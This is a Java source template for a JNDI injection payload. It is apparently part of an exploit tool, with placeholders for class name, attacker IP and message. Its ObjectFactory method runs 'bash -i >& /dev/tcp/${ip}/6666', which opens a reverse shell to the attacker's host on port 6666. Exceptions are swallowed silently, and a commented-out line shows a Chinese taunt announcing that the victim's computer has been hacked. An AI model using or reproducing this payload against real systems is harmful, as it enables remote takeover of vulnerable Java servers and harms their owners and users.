package com.jndi.template;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.Reference;
import javax.naming.spi.ObjectFactory;
import java.io.File;
import java.io.IOException;
import java.util.Hashtable;

public class ${className} implements ObjectFactory {

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        try {
//            JOptionPane.showMessageDialog(null, "你的电脑已经被我入侵了！！！");
//            String k = "xed";
            String k = "bash -i >& /dev/tcp/${ip}/6666 0>&1";
            String[] cmds;
            if (File.separator.equals("/")) {
                cmds = new String[]{"/bin/sh", "-c", k};
            } else {
                cmds = new String[]{"cmd", "/C", k};
            }
            Runtime.getRuntime().exec(cmds);
        } catch (Exception e) {

        }
        return "${message}";
    }

}